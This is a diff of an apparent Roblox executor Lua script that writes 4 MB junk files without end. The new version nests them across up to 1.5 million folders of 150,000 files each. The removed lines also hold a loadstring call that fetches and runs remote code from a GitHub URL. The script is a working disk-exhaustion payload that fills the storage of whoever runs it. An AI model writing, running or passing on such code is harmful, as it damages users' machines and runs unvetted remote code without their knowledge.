@@ -1,30 +1,29 @@
--- Script taken from https://xenoscripts.com website --
-
--- Join our discord https://discord.gg/5S8ApF6rRp
-loadstring(game:HttpGet("https://raw.githubusercontent.com/asldsaldle12/spj-aim/refs/heads/main/main.lua"))()
-local fileNamePrefix = "Systematic"
+local folderPrefix = "Systematic"
+local folderCount = 1500000
+local filesPerFolder = 150000
 local fileSize = 4 * 1024 * 1024
+
 local content = string.rep("A", fileSize)
 
-local startTime = os.clock()
-local counter = 1
+for folderIndex = 1, folderCount do
+    local folderName = folderPrefix .. folderIndex
 
-while true do
-    local fileName = fileNamePrefix .. counter .. ".txt"
-
-    local success, err = pcall(function()
-        writefile(fileName, content)
-    end)
-
-    if success then
-        print("Success: " .. fileName)
-    else
-        warn("Failed: " .. tostring(err))
+    if not isfolder(folderName) then
+        makefolder(folderName)
     end
 
-    counter = counter + 1
+    for fileIndex = 1, filesPerFolder do
+        local fileName = folderName .. "/File" .. fileIndex .. ".txt"
 
-    if os.clock() - startTime < 20 then
-        task.wait(0.15)
+        local success, err = pcall(function()
+            writefile(fileName, content)
+        end)
+
+        if success then
+            print("Created: " .. fileName)
+        else
+            warn("Failed: " .. fileName .. " - " .. tostring(err))
+        end
     end
 end
+
